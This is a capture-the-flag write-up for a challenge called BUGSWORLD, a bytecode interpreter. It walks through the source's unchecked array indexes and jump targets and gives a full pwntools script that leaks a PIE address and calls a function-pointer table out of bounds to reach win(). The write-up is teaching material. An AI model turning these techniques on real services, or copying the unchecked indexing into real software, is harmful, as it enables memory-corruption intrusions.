We are provided with the following  source code and binary that is running on a server.   

```c
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

void win() {
  printf("WINNER!\n");
  FILE *f = fopen("flag.txt", "r");
  char flag[200];
  unsigned long length = fread(flag, 1, sizeof(flag) - 1, f);
  flag[length] = '\0';
  printf("%s\n", flag);
  exit(0);
}

enum Instruction {
  INSTRUCTION_MOVE = 0,
  INSTRUCTION_TURNLEFT = 1,
  INSTRUCTION_TURNRIGHT = 2,
  INSTRUCTION_INFECT = 3,
  INSTRUCTION_SKIP = 4,
  INSTRUCTION_HALT = 5,
  INSTRUCTION_JUMP = 6,
  INSTRUCTION_JUMP_IF_NOT_NEXT_IS_EMPTY = 7,
  INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_EMPTY = 8,
  INSTRUCTION_JUMP_IF_NOT_NEXT_IS_WALL = 9,
  INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_WALL = 10,
  INSTRUCTION_JUMP_IF_NOT_NEXT_IS_FRIEND = 11,
  INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_FRIEND = 12,
  INSTRUCTION_JUMP_IF_NOT_NEXT_IS_ENEMY = 13,
  INSTRUCTION_JUMP_IF_NOT_NEXT_IS_NOT_ENEMY = 14,
  INSTRUCTION_JUMP_IF_NOT_RANDOM = 15,
  INSTRUCTION_JUMP_IF_NOT_TRUE = 16,
};

const char instruction_names[][32] = {
    "MOVE",
    "TURNLEFT",
    "TURNRIGHT",
    "INFECT",
    "SKIP",
    "HALT",
    "JUMP",
    "JUMP_IF_NOT_NEXT_IS_EMPTY",
    "JUMP_IF_NOT_NEXT_IS_NOT_EMPTY",
    "JUMP_IF_NOT_NEXT_IS_WALL",
    "JUMP_IF_NOT_NEXT_IS_NOT_WALL",
    "JUMP_IF_NOT_NEXT_IS_FRIEND",
    "JUMP_IF_NOT_NEXT_IS_NOT_FRIEND",
    "JUMP_IF_NOT_NEXT_IS_ENEMY",
    "JUMP_IF_NOT_NEXT_IS_NOT_ENEMY",
    "JUMP_IF_NOT_RANDOM",
    "JUMP_IF_NOT_TRUE",
};

typedef struct State {
  uint64_t pc;
  int x;
  int y;
  int rotation;
} State;

#define BOARD_SIZE 15

#define BYTECODE_SIZE 1000
uint64_t bytecode[BYTECODE_SIZE];

void do_move(State *state) {
  switch (state->rotation) {
  case 0: // right
    state->x++;
    break;
  case 1: // up
    state->y--;
    break;
  case 2: // left
    state->x--;
    break;
  case 3: // down
    state->y++;
    break;
  }
  if (state->x < 0)
    state->x = 0;
  if (state->x >= BOARD_SIZE)
    state->x = BOARD_SIZE - 1;
  if (state->y < 0)
    state->y = 0;
  if (state->y >= BOARD_SIZE)
    state->y = BOARD_SIZE - 1;
  state->pc++;
}

void do_turnleft(State *state) {
  state->rotation++;
  if (state->rotation >= 4)
    state->rotation -= 4;
  state->pc++;
}

void do_turnright(State *state) {
  state->rotation--;
  if (state->rotation < 0)
    state->rotation += 4;
  state->pc++;
}

void do_skip(State *state) { state->pc++; }

void do_not_implemented(State *state) {
  printf("Not implemented\n");
  exit(1);
}

void do_jump(State *state) {
  state->pc++;
  state->pc = bytecode[state->pc];
}

void dont_jump(State *state) {
  state->pc++;
  state->pc++;
}

bool next_is_out_of_bounds(State *state) {
  int oldx = state->x;
  int oldy = state->y;
  int oldpc = state->pc;
  do_move(state);
  state->pc = oldpc;
  if (state->x == oldx && state->y == oldy) {
    return true;
  }
  state->x = oldx;
  state->y = oldy;
  return false;
}

void do_jump_if_not_next_is_empty(State *state) {
  if (next_is_out_of_bounds(state))
    do_jump(state);
  else
    dont_jump(state);
}

void do_jump_if_not_next_is_not_empty(State *state) {
  if (!next_is_out_of_bounds(state))
    do_jump(state);
  else
    dont_jump(state);
}

void do_jump_if_random(State *state) {
  if (rand() % 2 == 0)
    do_jump(state);
  else
    dont_jump(state);
}

typedef void (*InstructionFunction)(State *);

InstructionFunction instruction_table[] = {
    do_move,                          // MOVE
    do_turnleft,                      // TURNLEFT
    do_turnright,                     // TURNRIGHT
    do_not_implemented,               // INFECT
    do_skip,                          // SKIP
    do_not_implemented,               // HALT (it stops before running this)
    do_jump,                          // JUMP
    do_jump_if_not_next_is_empty,     // JUMP_IF_NOT_NEXT_IS_EMPTY
    do_jump_if_not_next_is_not_empty, // JUMP_IF_NOT_NEXT_IS_NOT_EMPTY
    do_jump_if_not_next_is_not_empty, // JUMP_IF_NOT_NEXT_IS_WALL
    do_jump_if_not_next_is_empty,     // JUMP_IF_NOT_NEXT_IS_NOT_WALL
    do_not_implemented,               // JUMP_IF_NOT_NEXT_IS_FRIEND
    do_not_implemented,               // JUMP_IF_NOT_NEXT_IS_NOT_FRIEND
    do_not_implemented,               // JUMP_IF_NOT_NEXT_IS_ENEMY
    do_not_implemented,               // JUMP_IF_NOT_NEXT_IS_NOT_ENEMY
    do_jump_if_random,                // JUMP_IF_NOT_RANDOM
    dont_jump,                        // JUMP_IF_NOT_TRUE
};

void print_state(State *state) {
  for (int y = 0; y < BOARD_SIZE; y++) {
    for (int x = 0; x < BOARD_SIZE; x++) {
      if (x == state->x && y == state->y) {
        switch (state->rotation) {
        case 0:
          putc('>', stdout);
          break;
        case 1:
          putc('^', stdout);
          break;
        case 2:
          putc('<', stdout);
          break;
        case 3:
          putc('v', stdout);
          break;
        }
      } else {
        putc('.', stdout);
      }
    }
    putc('\n', stdout);
  }
}

void run_program() {
  printf("How many instructions in your bytecode?\n> ");
  uint32_t n;
  scanf("%u", &n);
  n += 1; // room for final HALT instruction
  if (n >= BYTECODE_SIZE) {
    printf("That's too many\n");
    exit(1);
  }
  printf("Enter your instructions:\n> ");
  for (uint32_t i = 0; i < n - 1; i++) {
    scanf("%lu", &bytecode[i]);
  }
  bytecode[n - 1] = INSTRUCTION_HALT;

  // show the disassembly and validate program
  for (int i = 0; i < n; i++) {
    printf("%s", instruction_names[bytecode[i]]);
    if (bytecode[i] < 0 || bytecode[i] > 16) {
      printf("Invalid instruction\n");
      return;
    }
    if (bytecode[i] >= INSTRUCTION_JUMP) {
      i++;
      printf(" %ld\n", bytecode[i]);
    } else {
      printf("\n");
    }
  }

  // run the program
  State state = {0};

  print_state(&state);
  usleep(25000);
  printf("\n\n");
  while (bytecode[state.pc] != INSTRUCTION_HALT) {
    instruction_table[bytecode[state.pc]](&state);
    print_state(&state);
    usleep(25000);
    printf("\n\n");
  }
}

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("Welcome to BUGSWORLD!\n");
  while (1) {
    run_program();
  }
}
```

Here is some basic information about the executable:  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/3ec76934-e5f4-40bc-9344-b8f5a478fba4)  

OKay, this might be a lot of source code, so I will summarize what the program is doing.
The program is basically an interpreter for their own "assembly language". The program follows the following flow:  
1. Ask for bytecode
2. Print and Verify assembly
3. Execute instructions
4. Loop again

---- 

###Vulnerability Analysis

##### 1. Jump Instruction

First we will look at the individual instructions to see if any of them have any vulnerabilities.  
The only interesting one is DO_JUMP -   
``` c

void do_jump(State *state) {
  state->pc++;
  state->pc = bytecode[state->pc];
}
```
There are two reasons why this function is particularly interesting:  
1. We can jump to any arbitrary part of our bytecode, Including potentially past the HALT instruction placed at the end of our code
2. It allows us to write anything to the bytecode without it being flagged as an Invalid Instruction.

##### 2. printf at program verification  
```c
 // show the disassembly and validate program
  for (int i = 0; i < n; i++) {
    printf("%s", instruction_names[bytecode[i]]);
    if (bytecode[i] < 0 || bytecode[i] > 16) {
      printf("Invalid instruction\n");
      return;
    }
    if (bytecode[i] >= INSTRUCTION_JUMP) {
      i++;
      printf(" %ld\n", bytecode[i]);
    } else {
      printf("\n");
    }
  }
```
We can see that the function prints the instruction name at the position specified by our bytecode before verifying that its a valid instruction.  
We can abuse this to index out of bounds to print program memory and potentially leak useful information.  

##### 3. instruction table indexing  
```c
 // run the program
  State state = {0};

  print_state(&state);
  usleep(25000);
  printf("\n\n");
  while (bytecode[state.pc] != INSTRUCTION_HALT) {
    instruction_table[bytecode[state.pc]](&state);
    print_state(&state);
    usleep(25000);
    printf("\n\n");
  }
```
We can see that we are using a table of pointers to functions to select the function we are calling.  
If we can potentially execute an instruction that is out of bounds of the instruction table, we might be able to call another pointer as if it was a function.

---- 

###Exploit Development  

Our final goal is to execute the `win()` function.  
We want to use vulnerability 3 to execute a pointer to the `win()` function, however there is no pointer to it in memory, so we have to construct it.  
Since the binary has PIE enabled, we first have to leak memory, so we will leverage vulnerability 2 to print a pointer to one of the functions in the instruction table to find the relative addressing.  
Then we will abuse the JUMP function to both write our pointer to `win()` in memory and to use vulnerability 3 to index a location of memory outside of the instruction table, where our pointer to win will be waiting to be executed.  

The plan is the following:  
1. Leak memory to find relative addressing of `win()`
2. Write a pointer to win in memory and also write an 'instruction' that will call that pointer if executed
3. Leverage the JUMP instruction to execute our invalid instruction.

Here is the final solve script:  
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chall.pwnoh.io --port 13382 ./bugsworld
from pwn import *
import struct 

# Set up pwntools for the correct architecture
elf = ELF('./bugsworld')
context.binary = './bugsworld'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chall.pwnoh.io'
port = int(args.PORT or 13382)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

p = start()
# STEP 1: LEAK MEMORY
p.recvuntil(b'?')
p.sendline(b'1')
p.recvuntil(b'>')

offset_to_instruction_table = (elf.sym['instruction_table'] - elf.sym['instruction_names'])//32

p.sendline(str(offset_to_instruction_table).encode())
p.recvuntil(b'>')
leak = p.recvuntil(b'Invalid instruction', drop=True)
leak = leak[1:]
leak += b'\x00\x00'

addr = struct.unpack('<Q',leak)[0]
# SET RELATIVE ADDRESSING

elf.address = addr - elf.sym['do_move']

log.success(f'Leaked memory: {hex(addr)}')
log.info(f"Address of win: {hex(elf.sym['win'])}")


# ABUSE THE INSTRUCTION TABLE TO CALL OUR CONSTRUCTED POINTER TO WIN
p.sendline(b'6')
p.recvuntil(b':')

# JUMP 3
p.sendline(b'6')
p.sendline(b'3')

# JUMP win
p.sendline(b'6')
off = (elf.sym.bytecode+5*8 - elf.sym.instruction_table)//8
p.sendline(str(off).encode())

#Pointer to win
p.sendline(b'6')
p.sendline(str(elf.sym['win']).encode())


p.interactive()

p.close()
```

